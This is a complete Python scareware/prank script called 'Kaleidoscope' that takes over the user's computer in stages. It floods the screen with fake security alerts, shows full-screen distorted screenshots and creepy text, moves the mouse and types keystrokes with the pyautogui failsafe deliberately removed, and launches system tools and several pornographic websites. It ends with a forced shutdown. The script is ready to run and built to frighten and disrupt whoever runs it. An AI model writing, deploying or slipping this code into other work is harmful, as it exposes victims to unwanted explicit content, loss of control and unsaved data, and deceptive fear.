# Required Imports
import pyautogui
import time
import platform
import os
import webbrowser
import random
from PIL import Image, ImageDraw, ImageFilter, ImageOps, ImageEnhance
import tkinter as tk
import string
import threading
import subprocess
import traceback
import math
import inspect

# Conditional import for sound (Windows only for now)
if platform.system() == "Windows":
    try: import winsound; WINSOUND_AVAILABLE = True
    except ImportError: print("Warning: 'winsound' module not found. Beep sounds disabled."); WINSOUND_AVAILABLE = False
else: WINSOUND_AVAILABLE = False

# Try importing plyer
try: from plyer import notification as plyer_notification; PLYER_AVAILABLE = True
except ImportError: print("Warning: 'plyer' library not found. Notifications disabled. pip install plyer"); PLYER_AVAILABLE = False

# --- Configuration ---
NUM_POPUP_WAVES = 4
POPUP_COUNT_PER_WAVE = (10, 20)
DISTORTION_DURATION_ROUND1 = 15
APP_OPEN_COUNT = 15
WEBSITE_COUNT = 8
PORN_WEBSITES = ["https://www.pornhub.com", "https://www.xvideos.com", "https://www.youporn.com", "https://www.eporner.com", "https://www.redtube.com"]
COUNTDOWN_DURATION = 10
NUM_NOTEPADS = 10
SCARY_ICON_PATH = "C:\\path\\to\\your\\scary_warning_icon.ico" # Replace or set ""
KEYBOARD_SPAM_DURATION = DISTORTION_DURATION_ROUND1
VISUAL_HELL_DURATION_ROUND1 = DISTORTION_DURATION_ROUND1
VISUAL_HELL_DURATION_ROUND2 = 20
FINAL_MELTDOWN_DURATION = 30
SHUTDOWN_DELAY_SECONDS = 60

ENABLE_KEYBOARD_SPAM = True # !!! SET TO False TO DISABLE DANGEROUS KEYBOARD SPAM (R1 ONLY) !!!
ENABLE_KEYBOARD_SPAM_FINAL = False # Keep final keyboard spam off by default

CREEPY_IMAGE_PATHS = [] # Add paths like "C:/path/to/img.png"
ROUND2_INTENSITY_FACTOR = 1.6
FINAL_MELTDOWN_INTENSITY = 2.5

# --- Helper Functions ---
# (Remain the same)
def show_scary_notification(title, message):
    if PLYER_AVAILABLE:
        app_title = random.choice(["CRITICAL SYSTEM ALERT", "Windows Security Failure", "Kernel Panic", "Encryption Daemon"]); icon = SCARY_ICON_PATH if os.path.exists(SCARY_ICON_PATH) else ""
        try: plyer_notification.notify( title=title, message=message, app_name=app_title, app_icon=icon, timeout=6 )
        except Exception as e: print(f"Notification error: {e}")
    else: print(f"Fake Notification (plyer disabled): {title} - {message}")
def set_wallpaper(image_path):
    abs_image_path = os.path.abspath(image_path); system = platform.system()
    try:
        if system == "Windows": import ctypes; SPI_SETDESKWALLPAPER = 20; ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abs_image_path, 3)
        elif system == "Darwin": script = f'osascript -e \'tell application "System Events" to tell every desktop to set picture to "{abs_image_path}"\''; subprocess.run(script, shell=True, check=True, capture_output=True, text=True)
        elif system == "Linux": command = ['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f'file://{abs_image_path}']; subprocess.run(command, check=True, capture_output=True, text=True); command_dark = ['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri-dark', f'file://{abs_image_path}']; subprocess.run(command_dark, check=False, capture_output=True, text=True)
    except Exception as e: print(f"Failed to set wallpaper: {e}")

# --- Stage 1: Popup Barrage ---
# (Remains the same)
def popup_wave(wave_num):
    scary_messages = [ "SECURITY BREACH...", "ERROR 0xDEADBEEF...", "WARNING: Ransomware detected...", "ALERT: Malicious process...", "CRITICAL: Network intrusion...", "SYSTEM FAILURE: MBR corruption...", "URGENT: Data exfiltration...", "FATAL ERROR: Integrity check failed...", "SECURITY ALERT: Rootkit detected...", "ENCRYPTION ACTIVE..." ]
    wave_title = random.choice([f"Wave {wave_num}", f"Attack {wave_num}", f"Alert Lvl {wave_num}"])
    print(f"--- Starting Popup Wave {wave_num} ---"); count = random.randint(POPUP_COUNT_PER_WAVE[0], POPUP_COUNT_PER_WAVE[1])
    for _ in range(count): show_scary_notification(wave_title, random.choice(scary_messages)); time.sleep(random.uniform(0.1, 0.5))
    print(f"--- Finished Popup Wave {wave_num} ---")

# --- Keyboard Spam Function (NO FAILSAFE) ---
keyboard_spam_active = threading.Event()
def keyboard_spammer(duration, identifier="R1"):
    print(f"--- KEYBOARD SPAM STARTED ({identifier}) --- NO ESCAPE! ---"); end_time = time.time() + duration; allowed_chars = string.printable.strip()
    keyboard_spam_active.set()
    while time.time() < end_time and keyboard_spam_active.is_set():
        try:
            text_to_spam = ''.join(random.choice(allowed_chars) for _ in range(random.randint(1, 5)))
            pyautogui.write(text_to_spam, interval=random.uniform(0.01, 0.05)); time.sleep(random.uniform(0.1, 0.5))
        except Exception as e: print(f"Keyboard spam error ({identifier}): {e}"); time.sleep(0.5)
    keyboard_spam_active.clear(); print(f"--- KEYBOARD SPAM ({identifier}) FINISHED ---")
def stop_keyboard_spam(): keyboard_spam_active.clear()

# --- Visual Hell & Mouse Frenzy (Round 1 - NO FAILSAFE) ---
visual_hell_active_round1 = threading.Event()
distorted_photo_round1 = None
def visual_hell_effect_round1(duration):
    global distorted_photo_round1; print("--- VISUAL HELL R1 --- NO ESCAPE! ---"); visual_hell_active_round1.set()
    end_time = time.time() + duration; screen_width, screen_height = pyautogui.size(); root = None; frame_count = 0
    try:
        root = tk.Tk(); root.attributes('-fullscreen', True); root.attributes('-topmost', True); root.configure(bg='black', cursor='none'); root.overrideredirect(True)
        label = tk.Label(root, bg='black'); label.pack(expand=True, fill=tk.BOTH)
        creepy_images_pil = []; from PIL import ImageTk
        if CREEPY_IMAGE_PATHS:
             for img_path in CREEPY_IMAGE_PATHS:
                 try: img = Image.open(img_path).convert("RGBA"); img.thumbnail((screen_width // 4, screen_height // 4)); creepy_images_pil.append(img)
                 except Exception as e: print(f"Img load fail {img_path}: {e}")
        while time.time() < end_time and visual_hell_active_round1.is_set():
            start_frame_time = time.time()
            try: # Outer try for frame processing
                screenshot = pyautogui.screenshot(); distorted_img = screenshot
                # --- Apply R1 Distortions ---
                if random.random() < 0.4: distorted_img = ImageEnhance.Color(distorted_img).enhance(random.uniform(0.1, 3.0))
                if random.random() < 0.4: distorted_img = ImageEnhance.Contrast(distorted_img).enhance(random.uniform(0.5, 2.0))
                if random.random() < 0.2: distorted_img = ImageOps.invert(distorted_img.convert('RGB'))
                if random.random() < 0.3:
                    # Inner try for filter application
                    try:
                        filt_type = random.choice([1,2,3,4])
                        if filt_type == 1: distorted_img = distorted_img.filter(ImageFilter.GaussianBlur(radius=random.uniform(1, 3)))
                        elif filt_type == 2: distorted_img = distorted_img.filter(ImageFilter.FIND_EDGES)
                        elif filt_type == 3: distorted_img = distorted_img.filter(ImageFilter.EDGE_ENHANCE_MORE)
                        else: distorted_img = distorted_img.filter(ImageFilter.ModeFilter(size=random.choice([3,5,7])))
                    except Exception as e: print(f"Filter error R1: {e}") # Inner except
                if random.random() < 0.15: # Text
                    try: # Wrap font loading/drawing in try/except
                        draw = ImageDraw.Draw(distorted_img); creepy_text = random.choice(["I SEE YOU", "WHY?", "WATCHING", "...", "<ERROR>", "BEHIND YOU", "HELP ME"]); font_size = random.randint(30, 80)
                        try: from PIL import ImageFont; font = ImageFont.truetype("arial.ttf", font_size)
                        except: font = ImageFont.load_default()
                        text_x, text_y = random.randint(0, screen_width - 200), random.randint(0, screen_height - 100); text_color = random.choice([(255,0,0, 180), (200,200,200, 150), (0,50,0, 200)]); draw.text((text_x, text_y), creepy_text, fill=text_color, font=font)
                    except Exception as e: print(f"Text draw error R1: {e}")
                if creepy_images_pil and random.random() < 0.2: # Images
                    try: # Wrap image pasting in try/except
                        img_to_paste = random.choice(creepy_images_pil); paste_x, paste_y = random.randint(0, screen_width - img_to_paste.width), random.randint(0, screen_height - img_to_paste.height); distorted_img.paste(img_to_paste, (paste_x, paste_y), img_to_paste)
                    except Exception as e: print(f"Image paste error R1: {e}")
                # Update Display
                distorted_photo_round1 = ImageTk.PhotoImage(distorted_img); label.config(image=distorted_photo_round1); root.update_idletasks(); root.update()
                # --- FAILSAFE REMOVED ---
                frame_time = time.time() - start_frame_time; sleep_time = max(0, 0.1 - frame_time); time.sleep(sleep_time); frame_count += 1
            except Exception as e: print(f"Visual hell R1 loop error: {e}"); time.sleep(0.5) # Outer except
    except Exception as e: print(f"Visual hell R1 setup error: {e}"); traceback.print_exc()
    finally: # Corrected finally
        if root:
            try: root.destroy()
            except Exception as e: pass
        visual_hell_active_round1.clear()
        print(f"--- VISUAL HELL R1 FINISHED ({frame_count} frames) ---")
def stop_visual_hell_round1(): visual_hell_active_round1.clear()

# --- Mouse Frenzy Function (NO FAILSAFE) ---
def mouse_frenzy(duration, active_flag):
    print(f"--- MOUSE FRENZY ({active_flag.name}) --- NO ESCAPE! ---"); end_time = time.time() + duration; screen_width, screen_height = pyautogui.size()
    while time.time() < end_time and active_flag.is_set():
        try:
            rand_x, rand_y = random.randint(0, screen_width - 1), random.randint(0, screen_height - 1)
            pyautogui.moveTo(rand_x, rand_y, duration=random.uniform(0.01, 0.03), tween=pyautogui.linear); time.sleep(0.005)
        except Exception: # Stop on other errors
             active_flag.clear(); break
    print(f"--- MOUSE FRENZY ({active_flag.name}) STOPPED ---")

# --- Visual Hell (Round 2 - NO FAILSAFE) ---
visual_hell_active_round2 = threading.Event()
distorted_photo_round2 = None
def visual_hell_effect_round2(duration):
    global distorted_photo_round2; print("--- VISUAL HELL R2 --- NO ESCAPE! ---"); visual_hell_active_round2.set()
    end_time = time.time() + duration; screen_width, screen_height = pyautogui.size(); root = None; frame_count = 0
    try:
        root = tk.Tk(); root.attributes('-fullscreen', True); root.attributes('-topmost', True); root.configure(bg='black', cursor='none'); root.overrideredirect(True)
        label = tk.Label(root, bg='black'); label.pack(expand=True, fill=tk.BOTH)
        creepy_images_pil = []; from PIL import ImageTk
        if CREEPY_IMAGE_PATHS:
             for img_path in CREEPY_IMAGE_PATHS:
                 try: img = Image.open(img_path).convert("RGBA"); img.thumbnail((screen_width // 3, screen_height // 3)); creepy_images_pil.append(img)
                 except Exception as e: print(f"Img load fail {img_path}: {e}")
        while time.time() < end_time and visual_hell_active_round2.is_set():
            start_frame_time = time.time()
            try: # Outer try for frame processing
                screenshot = pyautogui.screenshot(); distorted_img = screenshot
                # --- Apply R2 INTENSE Distortions ---
                intensity = ROUND2_INTENSITY_FACTOR
                if random.random() < 0.5 * intensity: distorted_img = ImageEnhance.Color(distorted_img).enhance(random.uniform(0.05, 4.0))
                if random.random() < 0.5 * intensity: distorted_img = ImageEnhance.Contrast(distorted_img).enhance(random.uniform(0.3, 3.0))
                if random.random() < 0.3 * intensity: distorted_img = ImageOps.invert(distorted_img.convert('RGB'))
                if random.random() < 0.4 * intensity:
                    # Inner try for filter application
                    try:
                        filt_type = random.choice([1,2,3,4])
                        if filt_type == 1: distorted_img = distorted_img.filter(ImageFilter.GaussianBlur(radius=random.uniform(2, 5)))
                        elif filt_type == 2: distorted_img = distorted_img.filter(ImageFilter.FIND_EDGES)
                        elif filt_type == 3: distorted_img = distorted_img.filter(ImageFilter.EDGE_ENHANCE_MORE)
                        else: distorted_img = distorted_img.filter(ImageFilter.ModeFilter(size=random.choice([5,7,9])))
                    except Exception as e: print(f"Filter error R2: {e}") # Inner except
                if random.random() < 0.25 * intensity: # More text
                    try: # Wrap font/draw
                        draw = ImageDraw.Draw(distorted_img); creepy_text = random.choice(["CAN YOU SEE ME?", "IT HURTS", "GET OUT", "WRONG", "CORRUPTED", "LOST", "TOO LATE"]); font_size = random.randint(40, 100);
                        try: from PIL import ImageFont; font = ImageFont.truetype("arialbd.ttf", font_size)
                        except: font = ImageFont.load_default()
                        text_x, text_y = random.randint(0, screen_width - 250), random.randint(0, screen_height - 150); text_color = random.choice([(255,0,0, 200), (255,255,255, 180), (0,0,0, 150)])
                        draw.text((text_x, text_y), creepy_text, fill=text_color, font=font)
                    except Exception as e: print(f"Text draw error R2: {e}")
                if creepy_images_pil and random.random() < 0.3 * intensity: # More images
                    try: # Wrap paste
                        img_to_paste = random.choice(creepy_images_pil); paste_x, paste_y = random.randint(0, screen_width - img_to_paste.width), random.randint(0, screen_height - img_to_paste.height); distorted_img.paste(img_to_paste, (paste_x, paste_y), img_to_paste)
                    except Exception as e: print(f"Image paste error R2: {e}")
                # Update Display
                distorted_photo_round2 = ImageTk.PhotoImage(distorted_img); label.config(image=distorted_photo_round2); root.update_idletasks(); root.update()
                # --- FAILSAFE REMOVED ---
                frame_time = time.time() - start_frame_time; sleep_time = max(0, (1/15) - frame_time); time.sleep(sleep_time); frame_count += 1
            except Exception as e: print(f"Visual hell R2 loop error: {e}"); time.sleep(0.5) # Outer except
    except Exception as e: print(f"Visual hell R2 setup error: {e}"); traceback.print_exc()
    finally: # Corrected finally
        if root:
            try: root.destroy()
            except Exception as e: pass
        visual_hell_active_round2.clear()
        print(f"--- VISUAL HELL R2 FINISHED ({frame_count} frames) ---")
def stop_visual_hell_round2(): visual_hell_active_round2.clear()

# --- Stages 3 & 4 (App Vomit, Website Flood) ---
# (Remain unchanged)
def open_more_apps():
    print(f"--- App Vomit ({APP_OPEN_COUNT}) ---"); apps_windows = ["calc", "mspaint", "notepad", "explorer", "cmd", "write", "control", "taskmgr", "eventvwr", "services.msc", "regedit", "powershell"]; apps_macos = ["open -a Calculator", "open -a TextEdit", "open -a Terminal", "open /System/Applications/Notes.app", "open -a System\\ Preferences", "open -a Console"]; apps_linux = ["gnome-calculator", "gedit", "gnome-terminal", "nautilus", "gnome-system-monitor", "baobab"]
    system = platform.system(); apps_to_open = []; opened_count = 0
    if system == "Windows": apps_to_open = apps_windows
    elif system == "Darwin": apps_to_open = apps_macos
    elif system == "Linux": apps_to_open = apps_linux
    else: print(f"Apps NA for OS: {system}"); return
    for _ in range(APP_OPEN_COUNT):
        app_command = random.choice(apps_to_open)
        try: use_shell = system != "Windows"; subprocess.Popen(app_command, shell=use_shell, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); opened_count += 1; time.sleep(random.uniform(0.1, 0.4))
        except Exception as e: print(f"App open fail '{app_command}': {e}")
    print(f"--- App Vomit Finished ({opened_count}/{APP_OPEN_COUNT}) ---")
def launch_more_websites():
    print(f"--- Website Flood ({WEBSITE_COUNT}) ---"); launched_count = 0
    if not PORN_WEBSITES: print("No websites. Skipping."); return
    for _ in range(WEBSITE_COUNT):
        url = random.choice(PORN_WEBSITES)
        try: webbrowser.open(url, new=2); launched_count += 1; time.sleep(random.uniform(0.3, 0.8))
        except Exception as e: print(f"Web fail {url}: {e}")
    print(f"--- Website Flood Finished ({launched_count}/{WEBSITE_COUNT}) ---")

# --- Stage 5: Notepad Spam ---
# (Remains unchanged)
def generate_gibberish(length=500): chars = string.printable; return ''.join(random.choice(chars) for _ in range(length))
def open_encrypted_notepads(count):
    print(f"--- Notepad Spam ({count}) ---"); import tempfile;
    for i in range(count):
        try:
            gibberish_header = random.choice(["[ENCRYPTED_BLOCK]", "::CORRUPT::", "//PAYLOAD//", "##NO_RECOVERY##"])
            gibberish_text = f"{gibberish_header} ID:{random.randint(1000,9999)}\n\n{generate_gibberish(random.randint(300, 800))}\n\n--- END ---"
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".txt", encoding='utf-8', errors='ignore') as tf: tf.write(gibberish_text); tfp = tf.name
            if platform.system() == "Windows": subprocess.Popen(['start', 'notepad', tfp], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif platform.system() == "Linux": subprocess.Popen(['gedit', tfp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif platform.system() == "Darwin": subprocess.Popen(['open', '-a', 'TextEdit', tfp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(random.uniform(0.1, 0.3))
        except Exception as e: print(f"Notepad spam error {i+1}: {e}")
    print(f"--- Notepad Spam Finished ---")

# --- Stage 6: Final Countdown ---
# (Remains unchanged)
def final_countdown():
    print("--- FINAL COUNTDOWN ---"); show_scary_notification("!!! SYSTEM MELTDOWN IMMINENT !!!", "No turning back."); time.sleep(1)
    for i in range(COUNTDOWN_DURATION, 0, -1): msg = random.choice([f"Erasure T-{i}", f"Meltdown T-{i}", f"Payload T-{i}", f"Destruct T-{i}"]); print(f"Countdown: {msg}"); show_scary_notification(f"FINAL PHASE: T-{i}", msg + "..."); time.sleep(1)
    show_scary_notification("***** OBLITERATION IMMINENT *****", "GOODBYE."); print("Initiating Final Meltdown..."); time.sleep(1)
    print("--- Final Countdown Finished ---")

# --- Stage 7: Final Meltdown (NO FAILSAFE) ---
visual_hell_active_final = threading.Event()
distorted_photo_final = None
def final_meltdown_effect(duration):
    global distorted_photo_final; print("--- FINAL MELTDOWN --- NO ESCAPE ---"); visual_hell_active_final.set()
    end_time = time.time() + duration; screen_width, screen_height = pyautogui.size(); root = None; frame_count = 0

    # Start mouse frenzy for the final round (NO FAILSAFE)
    visual_hell_active_final.name = "VH_FINAL_FLAG"
    final_mouse_thread = threading.Thread(target=mouse_frenzy, args=(duration, visual_hell_active_final), name="FinalMouseFrenzy_NF")
    final_mouse_thread.daemon = True
    final_mouse_thread.start()

    # Start final keyboard spam if enabled (NO FAILSAFE)
    final_kb_thread = None
    if ENABLE_KEYBOARD_SPAM_FINAL:
        final_kb_thread = threading.Thread(target=keyboard_spammer, args=(duration, "FINAL"), name="FinalKBSpam_NF")
        final_kb_thread.daemon = True
        final_kb_thread.start()

    # Start sound assault
    final_sound_thread = threading.Thread(target=sound_assault, args=(duration, visual_hell_active_final), name="FinalSoundAssault")
    final_sound_thread.daemon = True
    final_sound_thread.start()

    try:
        root = tk.Tk(); root.attributes('-fullscreen', True); root.attributes('-topmost', True); root.configure(bg='black', cursor='none'); root.overrideredirect(True)
        label = tk.Label(root, bg='black'); label.pack(expand=True, fill=tk.BOTH)
        creepy_images_pil = []; from PIL import ImageTk
        if CREEPY_IMAGE_PATHS:
             for img_path in CREEPY_IMAGE_PATHS:
                 try: img = Image.open(img_path).convert("RGBA"); img.thumbnail((screen_width // 2, screen_height // 2)); creepy_images_pil.append(img)
                 except Exception as e: print(f"Img load fail {img_path}: {e}")

        while time.time() < end_time and visual_hell_active_final.is_set():
            start_frame_time = time.time()
            # NO FAILSAFE EXCEPTION HANDLING
            try: # Outer try for frame processing
                screenshot = pyautogui.screenshot(); distorted_img = screenshot
                # --- Apply FINAL MELTDOWN Distortions ---
                intensity = FINAL_MELTDOWN_INTENSITY
                if random.random() < 0.6 * intensity: distorted_img = ImageEnhance.Color(distorted_img).enhance(random.uniform(0.0, 5.0))
                if random.random() < 0.6 * intensity: distorted_img = ImageEnhance.Contrast(distorted_img).enhance(random.uniform(0.1, 5.0))
                if random.random() < 0.5 * intensity: distorted_img = ImageOps.invert(distorted_img.convert('RGB'))
                if random.random() < 0.3 * intensity: distorted_img = ImageOps.solarize(distorted_img.convert('RGB'), threshold=random.randint(50, 200))
                if random.random() < 0.6 * intensity:
                    # Inner try for filter application - CORRECTED INDENTATION
                    try:
                        filt_type = random.choice([1,2,3,4])
                        if filt_type == 1: # Line ~301 was likely here or just after
                            distorted_img = distorted_img.filter(ImageFilter.GaussianBlur(radius=random.uniform(3, 8)))
                        elif filt_type == 2:
                            distorted_img = distorted_img.filter(ImageFilter.FIND_EDGES)
                        elif filt_type == 3:
                            distorted_img = distorted_img.filter(ImageFilter.EDGE_ENHANCE_MORE)
                        else:
                            distorted_img = distorted_img.filter(ImageFilter.ModeFilter(size=random.choice([7,9,11])))
                    # Inner except aligns with inner try
                    except Exception as e:
                        print(f"Filter error FINAL: {e}")
                if random.random() < 0.4 * intensity: # Constant text
                    try: # Wrap draw/font
                        draw = ImageDraw.Draw(distorted_img); creepy_text = random.choice(["END IS NEAR", "CAN'T STOP IT", "GOODBYE", "LOST CONTROL", "FATAL", "#####"]); font_size = random.randint(60, 120);
                        try: from PIL import ImageFont; font = ImageFont.truetype("courbd.ttf", font_size)
                        except: font = ImageFont.load_default()
                        text_x, text_y = random.randint(0, screen_width - 300), random.randint(0, screen_height - 200); text_color = random.choice([(255,0,0, 220), (255,255,255, 200), (0,0,0, 180)])
                        draw.text((text_x, text_y), creepy_text, fill=text_color, font=font)
                    except Exception as e: print(f"Text draw error FINAL: {e}")
                if creepy_images_pil and random.random() < 0.5 * intensity: # Constant images
                    try: # Wrap paste
                         img_to_paste = random.choice(creepy_images_pil); paste_x, paste_y = random.randint(0, screen_width - img_to_paste.width), random.randint(0, screen_height - img_to_paste.height); distorted_img.paste(img_to_paste, (paste_x, paste_y), img_to_paste)
                    except Exception as e: print(f"Image paste error FINAL: {e}")

                # Update Display
                distorted_photo_final = ImageTk.PhotoImage(distorted_img); label.config(image=distorted_photo_final); root.update_idletasks(); root.update()
                # --- FAILSAFE REMOVED ---
                frame_time = time.time() - start_frame_time; sleep_time = max(0, (1/20) - frame_time); time.sleep(sleep_time); frame_count += 1
            except Exception as e: print(f"Final Meltdown loop error: {e}"); time.sleep(0.1) # Outer except
    except Exception as e: print(f"Final Meltdown setup error: {e}"); traceback.print_exc()
    # --- CORRECTED FINALLY BLOCK FINAL ---
    finally:
        if root:
            try:
                root.destroy() # KILL IT
            except Exception as e:
                pass # Ignore errors
        visual_hell_active_final.clear() # Ensure flag is cleared
        stop_keyboard_spam() # Signal final KB spam to stop too
        print(f"--- FINAL MELTDOWN FINISHED ({frame_count} frames) ---")
def stop_final_meltdown(): visual_hell_active_final.clear()

# --- Sound Assault Function ---
# (Remains unchanged)
def sound_assault(duration, active_flag):
    if not WINSOUND_AVAILABLE: return
    print("--- SOUND ASSAULT INITIATED ---"); end_time = time.time() + duration
    while time.time() < end_time and active_flag.is_set():
        try: freq = random.randint(200, 2000); dur = random.randint(50, 150); winsound.Beep(freq, dur); time.sleep(random.uniform(0.01, 0.1))
        except Exception as e: time.sleep(0.1)
    print("--- SOUND ASSAULT FINISHED ---")

# --- Stage 8: Schedule Shutdown ---
# (Remains unchanged)
def schedule_shutdown(delay_seconds):
    system = platform.system(); cmd = None; abort_cmd = None
    print(f"\n--- SCHEDULING SHUTDOWN IN {delay_seconds} SECONDS ---"); show_scary_notification("!!! SHUTDOWN SCHEDULED !!!", f"System shutting down in {delay_seconds}s. NO ESCAPE.")
    if system == "Windows": cmd = f"shutdown /s /t {delay_seconds} /f /c \"Kaleidoscope owns you.\""; abort_cmd = "shutdown /a"
    elif system == "Linux": delay_minutes = max(1, round(delay_seconds / 60)); cmd = f"sudo shutdown -h +{delay_minutes} \"Kaleidoscope owns you.\""; abort_cmd = "sudo shutdown -c"
    elif system == "Darwin": delay_minutes = max(1, round(delay_seconds / 60)); cmd = f"sudo shutdown -h +{delay_minutes}"; abort_cmd = "sudo killall shutdown"
    else: print(f"Shutdown NA for OS: {system}"); return
    print(f"Executing: {cmd}");
    if abort_cmd: print(f"To cancel (Good luck): {abort_cmd}")
    try: subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); print("Shutdown command issued.")
    except Exception as e: print(f"!!! Error scheduling shutdown (Permissions?): {e} !!!")


# --- Main Execution ---
# (Structure remains the same, calls updated functions)
if __name__ == "__main__":
    keyboard_spam_thread = None; mouse_frenzy_thread = None; final_meltdown_thread = None
    try:
        print(" KALEIDOSCOPE: TOTAL MELTDOWN (NO FAILSAFE) ACTIVATED ".center(70, '!'))
        if ENABLE_KEYBOARD_SPAM or ENABLE_KEYBOARD_SPAM_FINAL: print("WARNING: KEYBOARD SPAM ENABLED - EXTREMELY DANGEROUS!")
        print("WARNING: VISUAL HELL x3 WILL FUCK YOUR CPU!")
        print("WARNING: FINAL STAGE INCLUDES SHUTDOWN TIMER!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print("!!! NO MOUSE FAILSAFE! KILL PYTHON PROCESS MANUALLY TO STOP! !!!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        time.sleep(8) # Last chance

        # Stages 1-6...
        print("\n>>> STAGE 1: NOTIFICATION NIGHTMARE <<<");
        for i in range(NUM_POPUP_WAVES): popup_wave(i + 1); time.sleep(random.uniform(0.3, 0.8))
        print("\n>>> STAGE 2: MIND MELT - ROUND 1 (NO ESCAPE) <<<")
        if ENABLE_KEYBOARD_SPAM: keyboard_spam_thread = threading.Thread(target=keyboard_spammer, args=(KEYBOARD_SPAM_DURATION, "R1")); keyboard_spam_thread.daemon = True; keyboard_spam_thread.start()
        else: print("Keyboard spam (R1) disabled.")
        visual_hell_active_round1.name = "VH_R1_FLAG"
        mouse_frenzy_thread = threading.Thread(target=mouse_frenzy, args=(VISUAL_HELL_DURATION_ROUND1, visual_hell_active_round1)); mouse_frenzy_thread.daemon = True; mouse_frenzy_thread.start()
        visual_hell_effect_round1(VISUAL_HELL_DURATION_ROUND1)
        stop_keyboard_spam(); print("Mind Melt R1 Ending..."); time.sleep(1)
        print("\n>>> STAGE 3: APPLICATION VOMIT <<<"); open_more_apps(); time.sleep(1)
        print("\n>>> STAGE 4: PORNADO ATTACK <<<"); launch_more_websites(); time.sleep(1)
        print("\n>>> STAGE 4.5: MIND MELT - ROUND 2 (NO ESCAPE) <<<")
        visual_hell_active_round2.name = "VH_R2_FLAG"
        visual_hell_effect_round2(VISUAL_HELL_DURATION_ROUND2)
        print("Mind Melt R2 Ending..."); time.sleep(1)
        print("\n>>> STAGE 5: ENCRYPTED GIBBERISH SPAM <<<"); open_encrypted_notepads(NUM_NOTEPADS); time.sleep(1)
        print("\n>>> STAGE 6: FINAL COUNTDOWN <<<"); final_countdown()

        # Stage 7
        print("\n>>> STAGE 7: FINAL SYSTEM MELTDOWN (NO ESCAPE) <<<");
        visual_hell_active_final.name="VH_FINAL_FLAG"
        final_meltdown_effect(FINAL_MELTDOWN_DURATION)
        print("Meltdown effects complete..."); time.sleep(1)

        # Stage 8
        print("\n>>> STAGE 8: SCHEDULING SHUTDOWN <<<")
        schedule_shutdown(SHUTDOWN_DELAY_SECONDS)

        print("#" * 70); print("KALEIDOSCOPE MELTDOWN complete. System shutdown pending. GOODBYE."); print("#" * 70)

    except KeyboardInterrupt: print("\n\n>>> USER INTERRUPTED - TRYING TO STOP (Shutdown might still be pending!) <<<"); stop_visual_hell_round1(); stop_visual_hell_round2(); stop_final_meltdown(); stop_keyboard_spam(); time.sleep(1)
    except Exception as e:
        print("\n" + "=" * 70); print(" TOTAL SYSTEM FAILURE! SCRIPT CRASHED! ".center(70)); print("=" * 70); print(f"{type(e).__name__}: {e}"); print("\n--- Traceback ---"); traceback.print_exc(); print("=" * 70)
        stop_visual_hell_round1(); stop_visual_hell_round2(); stop_final_meltdown(); stop_keyboard_spam(); # STOP EVERYTHING
    finally:
        print("\nExecution finished or crashed. Shutdown may be imminent.")
        stop_visual_hell_round1(); stop_visual_hell_round2(); stop_final_meltdown(); stop_keyboard_spam(); # Final stop signal
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print("!!! NO FAILSAFE WAS ACTIVE - HOPE YOU SURVIVED!           !!!")
        print(f"!!! SYSTEM SHUTDOWN SCHEDULED IN ~{SHUTDOWN_DELAY_SECONDS} SECONDS !!!")
        print("!!! Use OS tools to cancel if needed/possible (e.g., 'shutdown /a') !!!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print("Exiting script...")